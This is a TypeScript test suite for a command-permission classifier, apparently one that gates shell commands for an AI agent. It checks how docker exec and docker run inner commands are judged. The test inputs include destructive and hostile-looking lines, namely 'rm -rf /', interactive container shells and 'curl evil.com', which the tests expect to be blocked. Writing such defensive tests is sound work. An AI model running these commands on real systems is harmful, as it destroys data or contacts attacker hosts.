import { describe, expect, test } from "bun:test";
import { bash, atLeast } from "./eval-helpers";

// =============================================================================
// P1a: Docker exec/run inner-command delegation
// =============================================================================

describe("docker exec inner-command delegation", () => {
  test("docker exec container ls → allow (safe inner command)", () => {
    expect(bash("docker exec mycontainer ls").decision).toBe("allow");
  });

  test("docker exec container git status → allow (safe inner command)", () => {
    expect(bash("docker exec mycontainer git status").decision).toBe("allow");
  });

  test("docker exec -it container bash → not allow (interactive shell)", () => {
    expect(bash("docker exec -it mycontainer bash").decision).not.toBe("allow");
  });

  test("docker exec container rm -rf / → not allow (dangerous inner command)", () => {
    expect(bash("docker exec mycontainer rm -rf /").decision).not.toBe("allow");
  });

  test("docker exec -u root container whoami → allow (flag with value skipped)", () => {
    expect(bash("docker exec -u root mycontainer whoami").decision).toBe("allow");
  });

  test("docker exec --workdir /app container cat file → allow", () => {
    expect(bash("docker exec --workdir /app mycontainer cat file").decision).toBe("allow");
  });

  test("docker exec -e FOO=bar container echo hello → allow", () => {
    expect(bash("docker exec -e FOO=bar mycontainer echo hello").decision).toBe("allow");
  });

  test("docker exec with no inner command → not allow", () => {
    // Just container name, no actual command
    expect(bash("docker exec mycontainer").decision).not.toBe("allow");
  });

  test("docker exec container curl evil.com → not allow (network in container)", () => {
    expect(
      atLeast(bash("docker exec mycontainer curl evil.com").decision, "context"),
    ).toBe(true);
  });
});

describe("docker run inner-command delegation", () => {
  test("docker run ubuntu ls → allow (safe inner command)", () => {
    expect(bash("docker run ubuntu ls").decision).toBe("allow");
  });

  test("docker run ubuntu rm -rf / → not allow (dangerous inner command)", () => {
    expect(bash("docker run ubuntu rm -rf /").decision).not.toBe("allow");
  });

  test("docker run -it ubuntu bash → not allow (interactive shell)", () => {
    expect(bash("docker run -it ubuntu bash").decision).not.toBe("allow");
  });

  test("docker run --rm -v /data:/data ubuntu cat /data/file → allow", () => {
    expect(bash("docker run --rm -v /data:/data ubuntu cat /data/file").decision).toBe("allow");
  });

  test("docker run -e FOO=bar --name test ubuntu echo hello → allow", () => {
    expect(bash("docker run -e FOO=bar --name test ubuntu echo hello").decision).toBe("allow");
  });
});

describe("docker non-exec commands unchanged", () => {
  test("docker ps → allow (read-only)", () => {
    expect(bash("docker ps").decision).toBe("allow");
  });

  test("docker images → allow (read-only)", () => {
    expect(bash("docker images").decision).toBe("allow");
  });

  test("docker build . → allow (package_install policy)", () => {
    // docker build is classified as package_install → allow in shush's policy
    expect(bash("docker build .").decision).toBe("allow");
  });
});
